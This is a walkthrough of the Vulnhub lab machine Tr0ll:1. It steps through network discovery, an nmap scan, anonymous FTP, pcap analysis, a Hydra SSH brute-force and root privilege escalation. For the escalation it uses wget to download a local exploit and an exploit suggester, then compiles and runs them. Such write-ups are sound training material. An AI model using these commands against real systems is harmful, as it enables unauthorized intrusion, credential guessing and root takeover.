# TR0LL:1 — Walkthrough

**Vulnhub:**  
https://www.vulnhub.com/entry/tr0ll-1,100/

---

## Step 1 — Analysis and Enumeration

### Discovering the Target IP

```bash
sudo netdiscover -r 192.168.0.0/24
```

Look for the entry **PCS Systemtechnik GmbH** — that's the Tr0ll:1 machine.

---

### Port Scan

```bash
nmap -T4 -A -v <IP>
```

Key results:

```
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed
|_-rwxrwxrwx 1 1000 0 8068 Aug 09 2014 lol.pcap

22/tcp open  ssh     OpenSSH 6.6.1p1

80/tcp open  http    Apache 2.4.7
| robots.txt: /secret
```

---

## FTP

```bash
ftp <IP>
Name: Anonymous
Password: (press Enter)

ls
get lol.pcap
```

---

## Web Enumeration

Visit:

```
http://<IP>/
```

Check:

```
/robots.txt
/secret
```

---

## Analyzing lol.pcap

Open the file in Wireshark.  
In Raw FTP Data packet (#40), you will find:

```
Well, well, well...
you almost found the sup3rs3cr3tdirlol :-P
```

Navigate to:

```
http://<IP>/sup3rs3cr3tdirlol
```

Inside `roflmao`:

```
Find address 0x0856BF to proceed
```

Go to:

```
http://<IP>/0x0856BF
```

You will see:

- `good_luck/which_one_lol.txt`
- `this_folder_contains_the_password/Pass.txt`

Download both.

---

## Step 2 — Attack

### Brute-Force SSH with Hydra

```bash
hydra -L which_one_lol.txt -p Pass.txt ssh://<IP>
```

*Pass.txt is a string, not a file.*

Result:

```
login: overflow
password: Pass.txt
```

---

## SSH Access

```bash
ssh overflow@<IP>
bash
```

---

## Privilege Escalation

### Linux Exploit Suggester

```bash
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
./les.sh
```

Choose the exploit:

```
https://www.exploit-db.com/download/37292.c
```

---

### Compile and Run

```bash
wget https://www.exploit-db.com/download/37292.c
gcc 37292.c -o exploit
./exploit
```

---

## Root

```
# id
uid=0(root) gid=0(root)
```

Tr0ll:1 completed.
